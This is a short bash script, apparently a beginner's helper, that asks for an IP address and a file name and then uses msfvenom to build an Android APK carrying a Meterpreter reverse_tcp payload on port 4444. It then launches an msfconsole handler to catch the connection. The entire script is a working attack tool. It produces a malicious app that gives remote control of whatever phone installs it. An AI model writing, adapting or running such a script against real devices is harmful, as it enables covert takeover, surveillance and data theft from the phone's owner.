#!/bin/bash

ifconfig
echo -e "pls enter the your ip : \c"
read ip_name
echo -e "pls enter the name of the payload with .apk extions : \c"
read payload_name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip_name LPORT=4444 R > $payload_name
msfconsole -x "handler -p android/meterpreter/reverse_tcp -H $ip_name -P 4444"


